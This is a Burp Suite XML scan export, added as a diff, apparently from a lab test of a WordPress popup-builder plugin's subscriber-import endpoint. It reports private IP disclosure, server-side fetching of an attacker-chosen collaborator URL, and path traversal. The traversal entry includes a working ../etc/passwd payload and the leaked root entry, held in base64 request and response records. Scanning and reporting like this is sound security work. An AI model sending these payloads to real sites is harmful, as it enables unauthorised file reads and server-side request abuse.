@@ -1,0 +1,161 @@
+<?xml version="1.0"?>
+<!DOCTYPE issues [
+<!ELEMENT issues (issue*)>
+<!ATTLIST issues burpVersion CDATA "">
+<!ATTLIST issues exportTime CDATA "">
+<!ELEMENT issue (serialNumber, type, name, host, path, location, severity, confidence, issueBackground?, remediationBackground?, references?, vulnerabilityClassifications?, issueDetail?, issueDetailItems?, remediationDetail?, requestresponse*, collaboratorEvent*, infiltratorEvent*, staticAnalysis*, dynamicAnalysis*, prototypePollution*)>
+<!ELEMENT serialNumber (#PCDATA)>
+<!ELEMENT type (#PCDATA)>
+<!ELEMENT name (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT location (#PCDATA)>
+<!ELEMENT severity (#PCDATA)>
+<!ELEMENT confidence (#PCDATA)>
+<!ELEMENT issueBackground (#PCDATA)>
+<!ELEMENT remediationBackground (#PCDATA)>
+<!ELEMENT references (#PCDATA)>
+<!ELEMENT vulnerabilityClassifications (#PCDATA)>
+<!ELEMENT issueDetail (#PCDATA)>
+<!ELEMENT issueDetailItems (issueDetailItem*)>
+<!ELEMENT issueDetailItem (#PCDATA)>
+<!ELEMENT remediationDetail (#PCDATA)>
+<!ELEMENT requestresponse (request?, response?, responseRedirected?)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request method CDATA "">
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT responseRedirected (#PCDATA)>
+<!ELEMENT sender (#PCDATA)>
+<!ELEMENT message (#PCDATA)>
+<!ELEMENT conversation (#PCDATA)>
+<!ELEMENT recipient (#PCDATA)>
+<!ELEMENT recipients (recipient*)>
+<!ELEMENT smtp (sender, recipients, message, conversation)>
+<!ELEMENT collaboratorEvent (interactionType, originIp, time, lookupType?, lookupHost?, requestresponse?, smtp?)>
+<!ELEMENT interactionType (#PCDATA)>
+<!ELEMENT originIp (#PCDATA)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT lookupType (#PCDATA)>
+<!ELEMENT lookupHost (#PCDATA)>
+<!ELEMENT infiltratorEvent (parameterName, platform, signature, stackTrace?, parameterValue?, collaboratorEvent)>
+<!ELEMENT parameterName (#PCDATA)>
+<!ELEMENT platform (#PCDATA)>
+<!ELEMENT signature (#PCDATA)>
+<!ELEMENT stackTrace (#PCDATA)>
+<!ELEMENT parameterValue (#PCDATA)>
+<!ELEMENT dynamicAnalysis (source, sink, sourceStackTrace, sinkStackTrace, eventListenerStackTrace, sourceValue, sinkValue, eventHandlerData, eventHandlerDataType, eventHandlerManipulatedData, poc, origin, isOriginChecked, sourceElementId, sourceElementName, eventFiredEventName, eventFiredElementId, eventFiredElementName, eventFiredOuterHtml)>
+<!ELEMENT prototypePollution (poc, pollutionTechnique, pollutionType)>
+<!ELEMENT staticAnalysis (source, sink, codeSnippets)>
+<!ELEMENT source (#PCDATA)>
+<!ELEMENT sink (#PCDATA)>
+<!ELEMENT sourceStackTrace (#PCDATA)>
+<!ELEMENT sinkStackTrace (#PCDATA)>
+<!ELEMENT eventListenerStackTrace (#PCDATA)>
+<!ELEMENT sourceValue (#PCDATA)>
+<!ELEMENT sinkValue (#PCDATA)>
+<!ELEMENT eventHandlerData (#PCDATA)>
+<!ELEMENT eventHandlerDataType (#PCDATA)>
+<!ELEMENT sourceElementId (#PCDATA)>
+<!ELEMENT sourceElementName (#PCDATA)>
+<!ELEMENT eventFiredEventName (#PCDATA)>
+<!ELEMENT eventFiredElementId (#PCDATA)>
+<!ELEMENT eventFiredElementName (#PCDATA)>
+<!ELEMENT eventFiredOuterHtml (#PCDATA)>
+<!ELEMENT eventHandlerManipulatedData (#PCDATA)>
+<!ELEMENT poc (#PCDATA)>
+<!ELEMENT origin (#PCDATA)>
+<!ELEMENT isOriginChecked (#PCDATA)>
+<!ELEMENT codeSnippets (codeSnippet*)>
+<!ELEMENT codeSnippet (#PCDATA)>
+<!ELEMENT pollutionTechnique (#PCDATA)>
+<!ELEMENT pollutionType (#PCDATA)>
+]>
+<issues burpVersion="2023.8.1" exportTime="Wed Aug 16 00:39:08 GMT 2023">
+  <issue>
+    <serialNumber>2521536054884002816</serialNumber>
+    <type>134217728</type>
+    <name><![CDATA[Private IP addresses disclosed]]></name>
+    <host ip="172.20.0.3">http://web</host>
+    <path><![CDATA[/wp-admin/admin-ajax.php]]></path>
+    <location><![CDATA[/wp-admin/admin-ajax.php]]></location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>RFC 1918 specifies ranges of IP addresses that are reserved for use in private networks and cannot be routed on the public Internet. Although various methods exist by which an attacker can determine the public IP addresses in use by an organization, the private addresses used internally cannot usually be determined in the same ways.</p>
+<p>Discovering the private addresses used within an organization can help an attacker in carrying out network-layer attacks aiming to penetrate the organization's internal infrastructure. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>There is not usually any good reason to disclose the internal IP addresses used within an organization's infrastructure. If these are being returned in service banners or debug messages, then the relevant services should be configured to mask the private addresses. If they are being used to track back-end servers for load balancing purposes, then the addresses should be rewritten with innocuous identifiers from which an attacker cannot infer any useful information about the infrastructure.</p>]]></remediationBackground>
+    <issueDetail><![CDATA[The following RFC 1918 IP address was disclosed in the response:<ul><li>172.20.0.3</li></ul>]]></issueDetail>
+    <issueDetailItems>
+      <issueDetailItem><![CDATA[172.20.0.3]]></issueDetailItem>
+    </issueDetailItems>
+    <requestresponse>
+      <request method="POST" base64="true"><![CDATA[UE9TVCAvd3AtYWRtaW4vYWRtaW4tYWpheC5waHA/YWN0aW9uPXNncGJfaW1wb3J0X3N1YnNjcmliZXJzIEhUVFAvMS4wDQpIb3N0OiB3ZWINCkNvbnRlbnQtTGVuZ3RoOiA0NQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCg0KcG9wdXBTdWJzY3JpcHRpb25MaXN0PWZ1enomaW1wb3J0TGlzdFVSTD1mdXp6]]></request>
+      <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpEYXRlOiBXZWQsIDE2IEF1ZyAyMDIzIDAwOjM2OjA3IEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU2IChEZWJpYW4pDQpDb250ZW50LUxlbmd0aDogMzAyDQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMQ0KDQo8IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL0lFVEYvL0RURCBIVE1MIDIuMC8vRU4iPgo8aHRtbD48aGVhZD4KPHRpdGxlPjQwMCBCYWQgUmVxdWVzdDwvdGl0bGU+CjwvaGVhZD48Ym9keT4KPGgxPkJhZCBSZXF1ZXN0PC9oMT4KPHA+WW91ciBicm93c2VyIHNlbnQgYSByZXF1ZXN0IHRoYXQgdGhpcyBzZXJ2ZXIgY291bGQgbm90IHVuZGVyc3RhbmQuPGJyIC8+CjwvcD4KPGhyPgo8YWRkcmVzcz5BcGFjaGUvMi40LjU2IChEZWJpYW4pIFNlcnZlciBhdCAxNzIuMjAuMC4zIFBvcnQgODA8L2FkZHJlc3M+CjwvYm9keT48L2h0bWw+Cg==]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>6441294229361787904</serialNumber>
+    <type>134217728</type>
+    <name><![CDATA[Out-of-band resource load (HTTP)]]></name>
+    <host ip="172.20.0.3">http://web</host>
+    <path><![CDATA[/wp-admin/admin-ajax.php]]></path>
+    <location><![CDATA[/wp-admin/admin-ajax.php]]></location>
+    <severity>High</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>Out-of-band resource load arises when it is possible to induce an application to fetch content from an arbitrary external location, and incorporate that content into the application's own response(s). The ability to trigger arbitrary out-of-band resource load does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. 
+However, in many cases, it can indicate a vulnerability with serious consequences.</p>
+<p>The ability to request and retrieve web content from other systems can allow the application server to be used as a two-way attack proxy. 
+  By submitting suitable payloads, an attacker can cause the application server to attack, or retrieve content from, other systems that it can interact with. 
+  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
+  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>
+<p>Additionally, the application's processing of web content that is retrieved from arbitrary URLs exposes some important and non-conventional attack surface. 
+  An attacker can deploy a web server that returns malicious content, and then induce the application to retrieve and process that content. 
+  This processing might give rise to the types of input-based vulnerabilities that are normally found when unexpected input is submitted directly in requests to the application. 
+  The out-of-band attack surface that the application exposes should be thoroughly tested for these types of vulnerabilities. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, and determine whether the ability to trigger arbitrary out-of-band resource load is intended behavior. 
+  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
+  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter. 
+You should also ensure that content retrieved from other systems is processed in a safe manner, with the usual precautions that are applicable when processing input from direct incoming web requests.</p>
+<p>If the ability to trigger arbitrary out-of-band resource load is not intended behavior, then you should implement a whitelist of permitted URLs, and block requests to URLs that do not appear on this whitelist.</p>]]></remediationBackground>
+    <issueDetail><![CDATA[It is possible to induce the application to retrieve the contents of an arbitrary external URL and return those contents in its own response.<br><br>The payload <b>http://8v4mx67ybnfaajnruiku20qm1d76vwjm7eu5iu.oastify.com/?fuzz</b> was submitted in the <b>importListURL</b> parameter.<br><br>The application performed an HTTP request to the specified domain. The response from that request was then included in the application's own response.]]></issueDetail>
+    <requestresponse>
+      <request method="POST" base64="true"><![CDATA[UE9TVCAvd3AtYWRtaW4vYWRtaW4tYWpheC5waHA/YWN0aW9uPXNncGJfaW1wb3J0X3N1YnNjcmliZXJzIEhUVFAvMS4wDQpIb3N0OiB3ZWINCkNvbnRlbnQtTGVuZ3RoOiA0NQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCg0KcG9wdXBTdWJzY3JpcHRpb25MaXN0PWZ1enomaW1wb3J0TGlzdFVSTD1odHRwJTNhJTJmJTJmOHY0bXg2N3libmZhYWpucnVpa3UyMHFtMWQ3NnZ3am03ZXU1aXUub2FzdGlmeS5jb20lMmYlM2ZmdXp6]]></request>
+      <response base64="true"><![CDATA[SFRUUC8xLjAgMjAwIE9LDQpEYXRlOiBXZWQsIDE2IEF1ZyAyMDIzIDAwOjM3OjM1IEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU2IChEZWJpYW4pDQpYLVBvd2VyZWQtQnk6IFBIUC84LjEuMTgNClgtUm9ib3RzLVRhZzogbm9pbmRleA0KWC1Db250ZW50LVR5cGUtT3B0aW9uczogbm9zbmlmZg0KRXhwaXJlczogV2VkLCAxMSBKYW4gMTk4NCAwNTowMDowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUsIG1heC1hZ2U9MA0KUmVmZXJyZXItUG9saWN5OiBzdHJpY3Qtb3JpZ2luLXdoZW4tY3Jvc3Mtb3JpZ2luDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KQ29udGVudC1MZW5ndGg6IDEwNzINCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOA0KDQoKCjxkaXYgaWQ9ImltcG9ydFN1YnNjcmliZXJzU2Vjb25kU3RlcCI+Cgk8aDEgaWQ9ImltcG9ydFN1YnNjcmliZXJIZWFkZXIiPk1hdGNoIFlvdXIgRmllbGRzPC9oMT4KCTxkaXYgaWQ9ImltcG9ydFN1YnNjcmliZXJCb2R5Ij4KCQk8ZGl2IGNsYXNzPSJmb3JtSXRlbSBzZ3BiLWp1c3RpZnktY29udGVudC1hcm91bmQiPgoJCQk8ZGl2IGNsYXNzPSJmb3JtSXRlbV9fdGl0bGUiPgoJCQkJQXZhaWxhYmxlIGZpZWxkcwkJCTwvZGl2PgoJCQk8ZGl2IGNsYXNzPSJmb3JtSXRlbV9fdGl0bGUiPgoJCQkJT3VyIGxpc3QgZmllbGRzCQkJPC9kaXY+CgkJPC9kaXY+CgkJCQkJCQkJPGRpdiBjbGFzcz0iZm9ybUl0ZW0gc2dwYi1qdXN0aWZ5LWNvbnRlbnQtYmV0d2VlbiI+CgkJCQk8ZGl2IGNsYXNzPSJzdWJGb3JtSXRlbV9fdGl0bGUiPgoJCQkJCSZsdDtodG1sJmd0OyZsdDtib2R5Jmd0OzZ1YzJrd3p3Zm4xNTB6amk0YXlnZTN6amxnaWdpZ2tmamd6Jmx0Oy9ib2R5Jmd0OyZsdDsvaHRtbCZndDsJCQkJPC9kaXY+CgkJCQk8ZGl2PgoJCQkJCTxzZWxlY3QgY2xhc3M9ImpzLXNnLXNlbGVjdDIgc2dwYi1vdXItZmllbGRzLWtleXMgc2VsZWN0X19zZWxlY3QiIGRhdGEtaW5kZXg9IjAiPjxvcHRpb24gdmFsdWU9IiIgc2VsZWN0ZWQ+U2VsZWN0IEZpZWxkPC9vcHRpb24+PC9zZWxlY3Q+CQkJCTwvZGl2PgoJCQk8L2Rpdj4KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIGNsYXNzPSJzZ3BiLXRvLWltcG9ydC1wb3B1cC1pZCIgdmFsdWU9IjAiPgoJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIGNsYXNzPSJzZ3BiLWltcG9ydGVkLWZpbGUtdXJsIiB2YWx1ZT0iaHR0cDovLzh2NG14Njd5Ym5mYWFqbnJ1aWt1MjBxbTFkNzZ2d2ptN2V1NWl1Lm9hc3RpZnkuY29tLz9mdXp6Ij4KCTwvZGl2PgoKCTxkaXYgaWQ9ImltcG9ydFN1YnNjcmliZXJGb290ZXIiPgoJCTxpbnB1dCB0eXBlPSJidXR0b24iIHZhbHVlPSJTYXZlIiBjbGFzcz0ic2dwYi1idG4gc2dwYi1idG4tYmx1ZSBzZ3BiLXNhdmUtc3Vic2NyaWJlciIgZGF0YS1hamF4bm9uY2U9InBvcHVwQnVpbGRlckFqYXhOb25jZSI+Cgk8L2Rpdj4KCjwvZGl2PgoK]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+    <collaboratorEvent>
+      <interactionType>HTTP</interactionType>
+      <originIp>130.149.230.61</originIp>
+      <time>2023-Aug-16 00:36:25.550 UTC</time>
+      <requestresponse>
+        <request method="GET" base64="true"><![CDATA[R0VUIC8/ZnV6eiBIVFRQLzEuMQ0KSG9zdDogOHY0bXg2N3libmZhYWpucnVpa3UyMHFtMWQ3NnZ3am03ZXU1aXUub2FzdGlmeS5jb20NClVzZXItQWdlbnQ6IFdvcmRQcmVzcy82LjEuMTsgaHR0cDovL3dlYg0KQWNjZXB0OiAqLyoNCkFjY2VwdC1FbmNvZGluZzogZGVmbGF0ZSwgZ3ppcCwgYnINClJlZmVyZXI6IGh0dHA6Ly84djRteDY3eWJuZmFham5ydWlrdTIwcW0xZDc2dndqbTdldTVpdS5vYXN0aWZ5LmNvbS8/ZnV6eg0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
+        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDk2DQoNCjxodG1sPjxib2R5PjZ1YzJrd3p3Zm4xNTB6amk0YXlnZTN6amxnaWdpZ2tmamd6NnVjMmt3endmbjE1MHpqaTRheWdlM3pqbGdpZ2lna2ZqZ3o8L2JvZHk+PC9odG1sPg==]]></response>
+        <responseRedirected>false</responseRedirected>
+      </requestresponse>
+    </collaboratorEvent>
+  </issue>
+  <issue>
+    <serialNumber>3848445447167904768</serialNumber>
+    <type>134217728</type>
+    <name><![CDATA[File path traversal]]></name>
+    <host ip="172.20.0.3">http://web</host>
+    <path><![CDATA[/wp-admin/admin-ajax.php]]></path>
+    <location><![CDATA[/wp-admin/admin-ajax.php]]></location>
+    <severity>High</severity>
+    <confidence>Firm</confidence>
+    <issueBackground><![CDATA[<p>File path traversal vulnerabilities arise when user-controllable data is used within a filesystem operation in an unsafe manner. Typically, a user-supplied filename is appended to a directory prefix in order to read or write the contents of a file. If vulnerable, an attacker can supply path traversal sequences (using dot-dot-slash characters) to break out of the intended directory and read or write files elsewhere on the filesystem.</p>
+<p>This is typically a very serious vulnerability, enabling an attacker to access sensitive files containing configuration data, passwords, database records, log data, source code, and program scripts and binaries. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>Ideally, application functionality should be designed in such a way that user-controllable data does not need to be passed to filesystem operations. This can normally be achieved by referencing known files via an index number rather than their name, and using application-generated filenames to save user-supplied file content.</p>
+<p>If it is considered unavoidable to pass user-controllable data to a filesystem operation, three layers of defense can be employed to prevent path traversal attacks: </p>
+<ul><li>User-controllable data should be strictly validated before being passed to any filesystem operation. In particular, input containing dot-dot sequences should be blocked.</li><li>After validating user input, the application can use a suitable filesystem API to verify that the file to be accessed is actually located within the base directory used by the application. In Java, this can be achieved by instantiating a java.io.File object using the user-supplied filename and then calling the getCanonicalPath method on this object. If the string returned by this method does not begin with the name of the start directory, then the user has somehow bypassed the application's input filters, and the request should be rejected. In ASP.NET, the same check can be performed by passing the user-supplied filename to the System.Io.Path.GetFullPath method and checking the returned string in the same way as described for Java.</li><li>The directory used to store files that are accessed using user-controllable data can be located on a separate logical volume to other sensitive application and operating system files, so that these cannot be reached via path traversal attacks. In Unix-based systems, this can be achieved using a chrooted filesystem; on Windows, this can be achieved by mounting the base directory as a new logical drive and using the associated drive letter to access its contents.</li></ul>]]></remediationBackground>
+    <issueDetail><![CDATA[The <b>importListURL</b> parameter is vulnerable to path traversal attacks, enabling read access to arbitrary files on the server.<br><br>The payload <b>../../../../../../../../../../../../../../../../etc/passwd</b> was submitted in the importListURL parameter. The requested file was returned in the application's response.]]></issueDetail>
+    <requestresponse>
+      <request method="POST" base64="true"><![CDATA[UE9TVCAvd3AtYWRtaW4vYWRtaW4tYWpheC5waHA/YWN0aW9uPXNncGJfaW1wb3J0X3N1YnNjcmliZXJzIEhUVFAvMS4wDQpIb3N0OiB3ZWINCkNvbnRlbnQtTGVuZ3RoOiA0NQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCg0KcG9wdXBTdWJzY3JpcHRpb25MaXN0PWZ1enomaW1wb3J0TGlzdFVSTD0uLiUyZi4uJTJmLi4lMmYuLiUyZi4uJTJmLi4lMmYuLiUyZi4uJTJmLi4lMmYuLiUyZi4uJTJmLi4lMmYuLiUyZi4uJTJmLi4lMmYuLiUyZmV0YyUyZnBhc3N3ZA==]]></request>
+      <response base64="true"><![CDATA[SFRUUC8xLjAgMjAwIE9LDQpEYXRlOiBXZWQsIDE2IEF1ZyAyMDIzIDAwOjM3OjQ0IEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU2IChEZWJpYW4pDQpYLVBvd2VyZWQtQnk6IFBIUC84LjEuMTgNClgtUm9ib3RzLVRhZzogbm9pbmRleA0KWC1Db250ZW50LVR5cGUtT3B0aW9uczogbm9zbmlmZg0KRXhwaXJlczogV2VkLCAxMSBKYW4gMTk4NCAwNTowMDowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUsIG1heC1hZ2U9MA0KUmVmZXJyZXItUG9saWN5OiBzdHJpY3Qtb3JpZ2luLXdoZW4tY3Jvc3Mtb3JpZ2luDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KQ29udGVudC1MZW5ndGg6IDEwMTMNCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOA0KDQoKCjxkaXYgaWQ9ImltcG9ydFN1YnNjcmliZXJzU2Vjb25kU3RlcCI+Cgk8aDEgaWQ9ImltcG9ydFN1YnNjcmliZXJIZWFkZXIiPk1hdGNoIFlvdXIgRmllbGRzPC9oMT4KCTxkaXYgaWQ9ImltcG9ydFN1YnNjcmliZXJCb2R5Ij4KCQk8ZGl2IGNsYXNzPSJmb3JtSXRlbSBzZ3BiLWp1c3RpZnktY29udGVudC1hcm91bmQiPgoJCQk8ZGl2IGNsYXNzPSJmb3JtSXRlbV9fdGl0bGUiPgoJCQkJQXZhaWxhYmxlIGZpZWxkcwkJCTwvZGl2PgoJCQk8ZGl2IGNsYXNzPSJmb3JtSXRlbV9fdGl0bGUiPgoJCQkJT3VyIGxpc3QgZmllbGRzCQkJPC9kaXY+CgkJPC9kaXY+CgkJCQkJCQkJPGRpdiBjbGFzcz0iZm9ybUl0ZW0gc2dwYi1qdXN0aWZ5LWNvbnRlbnQtYmV0d2VlbiI+CgkJCQk8ZGl2IGNsYXNzPSJzdWJGb3JtSXRlbV9fdGl0bGUiPgoJCQkJCXJvb3Q6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gJCQkJPC9kaXY+CgkJCQk8ZGl2PgoJCQkJCTxzZWxlY3QgY2xhc3M9ImpzLXNnLXNlbGVjdDIgc2dwYi1vdXItZmllbGRzLWtleXMgc2VsZWN0X19zZWxlY3QiIGRhdGEtaW5kZXg9IjAiPjxvcHRpb24gdmFsdWU9IiIgc2VsZWN0ZWQ+U2VsZWN0IEZpZWxkPC9vcHRpb24+PC9zZWxlY3Q+CQkJCTwvZGl2PgoJCQk8L2Rpdj4KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIGNsYXNzPSJzZ3BiLXRvLWltcG9ydC1wb3B1cC1pZCIgdmFsdWU9IjAiPgoJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIGNsYXNzPSJzZ3BiLWltcG9ydGVkLWZpbGUtdXJsIiB2YWx1ZT0iLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCI+Cgk8L2Rpdj4KCgk8ZGl2IGlkPSJpbXBvcnRTdWJzY3JpYmVyRm9vdGVyIj4KCQk8aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iU2F2ZSIgY2xhc3M9InNncGItYnRuIHNncGItYnRuLWJsdWUgc2dwYi1zYXZlLXN1YnNjcmliZXIiIGRhdGEtYWpheG5vbmNlPSJwb3B1cEJ1aWxkZXJBamF4Tm9uY2UiPgoJPC9kaXY+Cgo8L2Rpdj4KCg==]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+</issues>
